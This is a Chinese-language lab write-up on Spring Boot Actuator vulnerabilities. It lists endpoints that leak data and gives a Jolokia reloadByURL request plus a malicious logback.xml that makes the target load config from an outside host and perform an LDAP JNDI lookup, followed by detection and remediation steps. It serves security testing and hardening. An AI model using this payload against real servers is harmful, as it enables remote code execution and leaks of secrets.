# Actuator 漏洞靶场

## 1、直接信息泄漏

### 利用条件
对外开放，且没有认证配置

### 黑盒检测方式
常见路径 /，/actuator，/monitor。

```
/autoconfig
/configprops
/beans
/dump
/env
/health
/info
/logfile
/mappings
/metrics
/shutdown POST
/trace 泄漏cookie等

```

## 2、JDNI注入

### 利用条件
除以上外，需要有以下依赖

```xml

<!--        jolokia dependency-->
<dependency>
    <groupId>org.jolokia</groupId>
    <artifactId>jolokia-core</artifactId>
    <version>1.6.0</version>
</dependency>

ch.qos.logback:logback-core(由Spring boot自动引入)

+- org.springframework.boot:spring-boot-starter-web:jar:1.4.7.RELEASE:compile
[INFO] |  +- org.springframework.boot:spring-boot-starter:jar:1.4.7.RELEASE:compile
[INFO] |  |  +- org.springframework.boot:spring-boot:jar:1.4.7.RELEASE:compile
[INFO] |  |  +- org.springframework.boot:spring-boot-autoconfigure:jar:1.4.7.RELEASE:compile
[INFO] |  |  +- org.springframework.boot:spring-boot-starter-logging:jar:1.4.7.RELEASE:compile
[INFO] |  |  |  +- ch.qos.logback:logback-classic:jar:1.1.11:compile
[INFO] |  |  |  |  \- ch.qos.logback:logback-core:jar:1.1.11:compile
[INFO] |  |  |  +- org.slf4j:jcl-over-slf4j:jar:1.7.25:compile
[INFO] |  |  |  +- org.slf4j:jul-to-slf4j:jar:1.7.25:compile
[INFO] |  |  |  \- org.slf4j:log4j-over-slf4j:jar:1.7.25:compile
[INFO] |  |  +- org.springframework:spring-core:jar:4.3.9.RELEASE:compile
[INFO] |  |  \- org.yaml:snakeyaml:jar:1.17:runtime

```
### 黑盒扫描

打DNS记录说明即可。

```xml
http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/dns.log!/logback.xml
```
手工验证：

（1）在dns.log服务器上存放logback.xml。
内容为：
```xml
<configuration>
<!--执行LADAP服务器，传入lookup（）进行LDAP注入-->
  <insertFromJNDI env-entry-name="ldap://ldapserver.com:1389/jndi" as="appName" />
</configuration>
```
（2）在ldapserver.com上搭建LDAP服务。

## 3、利用/env里用的内容进行攻击

检测的话，直接/env有啥，甲方自家的话直接 推高危漏洞了。

参考https://www.veracode.com/blog/research/exploiting-spring-boot-actuators即可。

# 白盒扫描

直接扫描是否存在dependency以及是否有安全配置。

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-actuator</artifactId>
</dependency>
```

是否启动了安全配置(可能是yaml,xml,properties文件)

```xml

management.security.enabled=true

security.user.name=xxxxx

security.user.password=xxxxxx
```

## 漏洞修复

### 方式1：禁用所有接口

```xml
endpoints.enabled = false
```

### 方式2：启动安全配置

```xml
management.port=8099

management.security.enabled=true

security.user.name=xxxxx

security.user.password=xxxxxx
```
